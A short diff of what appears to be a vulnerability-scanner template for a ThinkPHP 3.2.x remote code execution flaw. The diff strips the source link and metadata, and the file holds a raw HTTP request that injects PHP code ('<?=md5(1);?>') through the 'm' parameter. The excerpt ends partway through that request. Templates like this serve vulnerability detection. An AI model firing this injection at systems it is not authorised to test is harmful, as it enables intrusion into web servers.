@@ -3,12 +3,8 @@ info:
   name: thinkphp32x_rce
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bahq4tazgtskp1mx'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bahq4tazgtskp1mx
-    fofa: 暂无
 http:
 - raw:
   - 'GET /index.php?m=--%3E%3C?=md5(1);?%3E HTTP/1.1
